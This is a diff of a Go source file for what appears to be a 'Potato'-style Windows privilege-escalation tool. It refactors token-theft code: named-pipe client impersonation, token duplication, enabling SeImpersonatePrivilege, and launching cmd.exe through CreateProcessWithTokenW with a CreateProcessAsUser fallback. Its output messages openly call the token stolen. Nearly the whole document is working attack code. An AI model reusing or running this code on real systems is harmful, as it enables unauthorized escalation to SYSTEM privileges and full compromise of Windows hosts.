@@ -2,7 +2,6 @@ package main
 
 import (
 	"fmt"
-	"os"
 	"syscall"
 	"unsafe"
 
@@ -10,8 +9,14 @@ import (
 )
 
 const (
-	MODE_NAMED_PIPE = 0
-	MODE_HTTP       = 1
+	SE_IMPERSONATE          = "SeImpersonatePrivilege"
+	SE_ASSIGN_PRIMARY_TOKEN = "SeAssignPrimaryToken"
+	SE_INCREASE_QUOTE_NAME  = "SeIncreaseQuoteName"
+	SECPKG_CRED_INBOUND     = 0x00000001
+	CREATE_NEW_CONSOLE      = 0x00000010
+	SecurityImpersonation   = 0x00000002
+	program                 = "C:\\Windows\\System32\\cmd.exe"
+	args                    = ""
 )
 
 var (
@@ -20,35 +25,31 @@ var (
 	createProcessWithTokenW      = advapi32DLL.NewProc("CreateProcessWithTokenW")
 	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
 	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")
+
+	secur32DLL               = syscall.NewLazyDLL("secur32.dll")
+	acquireCredentialsHandle = secur32DLL.NewProc("AcquireCredentialsHandle")
 )
 
-type IGotatoAPI interface {
+type ITokenNegotiator interface {
 	Trigger() bool
-	Start()
-	NamedPipeListener()
-	HttpListener()
+	Serve() (*windows.Token, error)
 }
 
-type GotatoAPI struct {
-	Port            uint
-	Host            string
-	Mode            uint
-	DuplicatedToken windows.Token
-}
-
-func (api GotatoAPI) ExecuteWithToken() error {
+func ExecuteWithToken(token windows.Token) error {
 	var si windows.StartupInfo
 	var pi windows.ProcessInformation
 
-	_, _, err := createProcessWithTokenW.Call(uintptr(api.DuplicatedToken), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(program))), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(args))),
+	_, _, err := createProcessWithTokenW.Call(uintptr(token), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(program))), uintptr(unsafe.Pointer(windows.StringToUTF16Ptr(args))),
 		CREATE_NEW_CONSOLE, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
 
 	if err != syscall.Errno(0) {
-		fmt.Println("[!] Failed to create process with stolen token")
-		err := windows.CreateProcessAsUser(api.DuplicatedToken, windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, false, CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
-		fmt.Println(err)
+		fmt.Println("[!] CreateProcessWithTokenW failed, trying CreateProcessAsUser")
+		err := windows.CreateProcessAsUser(token, windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, false, CREATE_NEW_CONSOLE, nil, nil, &si, &pi)
 
-		return err
+		if err != nil {
+			fmt.Println("[!] CreateProcessAsUser failed")
+			return err
+		}
 	}
 
 	fmt.Println("[*] Process spawned with stolen token!")
@@ -56,117 +57,39 @@ func (api GotatoAPI) ExecuteWithToken() error {
 	return nil
 }
 
-func (api GotatoAPI) NamedPipeListener() error {
-	var sd windows.SECURITY_DESCRIPTOR
-	pipeName := "\\\\.\\pipe\\test"
-
-	_, _, err := initializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd)), 1)
-	if err == syscall.Errno(0) {
-		_, _, err = setSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd)), 1, 0, 0)
-		if err != syscall.Errno(0) {
-			fmt.Println("[!] Couldn't allow everyone to read pipe - if you are attacking SYSTEM this is fine")
-		} else {
-			fmt.Println("[+] Set DACL to allow anyone to access")
-		}
-	}
-
-	sa := windows.SecurityAttributes{
-		Length:             40,
-		SecurityDescriptor: &sd,
-		InheritHandle:      0,
-	}
-	pipeHandle, err := windows.CreateNamedPipe(windows.StringToUTF16Ptr(pipeName), windows.PIPE_ACCESS_DUPLEX, windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT|windows.PIPE_REJECT_REMOTE_CLIENTS, 10, 2048, 2048, 0, &sa)
+func EnablePrivilege(securityEntity string) bool {
+	var luid windows.LUID
+	var token windows.Token
+	err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(securityEntity), &luid)
 
 	if err != nil {
-		fmt.Println("[!] Failed to create pipe "+pipeName+": ", windows.GetLastError())
-		return err
+		return false
 	}
 
-	fmt.Println("[+] Created pipe, listening for connections")
-	err = windows.ConnectNamedPipe(pipeHandle, nil)
-
+	handle, err := windows.GetCurrentProcess()
 	if err != nil {
-		fmt.Println("[!] Failed to connect to pipe "+pipeName+": ", windows.GetLastError())
-		windows.CloseHandle(pipeHandle)
-		return err
+		return false
 	}
 
-	fmt.Println("[+] Connection established, duplicating client token")
-
-	buf := []byte{0}
-	_, err = windows.Read(pipeHandle, buf)
-
+	err = windows.OpenProcessToken(handle, windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &token)
 	if err != nil {
-		fmt.Println("[!] Failed to read from pipe")
-		return err
+		return false
 	}
 
-	_, _, err = impersonateNamedPipeClient.Call(uintptr(pipeHandle))
-
-	if err != syscall.Errno(0) {
-		fmt.Println("[!] Call to ImpersonateNamedPipeClient failed")
-		return err
+	tokenPrivs := windows.Tokenprivileges{
+		PrivilegeCount: 1,
+		Privileges: [1]windows.LUIDAndAttributes{
+			{
+				Luid:       luid,
+				Attributes: windows.SE_PRIVILEGE_ENABLED,
+			},
+		},
 	}
 
-	threadHandle, err := windows.GetCurrentThread()
-
-	if err != nil {
-		fmt.Println("[!] Failed to get current thread")
-		return err
+	err = windows.AdjustTokenPrivileges(token, false, &tokenPrivs, 1024, nil, nil)
+	if err != nil || windows.GetLastError() != nil {
+		return false
 	}
 
-	var threadToken windows.Token
-	err = windows.OpenThreadToken(threadHandle, windows.TOKEN_ALL_ACCESS, false, &threadToken)
-
-	if err != nil {
-		fmt.Println("[!] Failed to open thread token")
-		return err
-	}
-
-	var systemToken windows.Token
-	err = windows.DuplicateTokenEx(threadToken, windows.MAXIMUM_ALLOWED, nil, SecurityImpersonation, windows.TokenPrimary, &systemToken)
-
-	if err != nil {
-		fmt.Println("[!] Failed to duplicate client token")
-		return err
-	}
-
-	hostName, _ := os.Hostname()
-	principal, _ := systemToken.GetTokenUser()
-	sid := principal.User.Sid
-	account, domain, _, _ := sid.LookupAccount(hostName)
-	fmt.Println("[+] Stole token from " + domain + "\\" + account + " (" + sid.String() + ")")
-
-	windows.RevertToSelf()
-	windows.CloseHandle(pipeHandle)
-
-	api.DuplicatedToken = systemToken
-	err = api.ExecuteWithToken()
-
-	if err != nil {
-		fmt.Println("[!] Failed to execute with stolen token")
-		return err
-	}
-
-	return nil
-}
-
-func (api GotatoAPI) HttpListener() {
-
-}
-
-func (api GotatoAPI) Listen() {
-	switch api.Mode {
-	case MODE_NAMED_PIPE:
-		err := api.NamedPipeListener()
-		if err != nil {
-			fmt.Println(err)
-		}
-	case MODE_HTTP:
-		api.HttpListener()
-	}
-}
-
-func (api GotatoAPI) Trigger() bool {
 	return true
 }
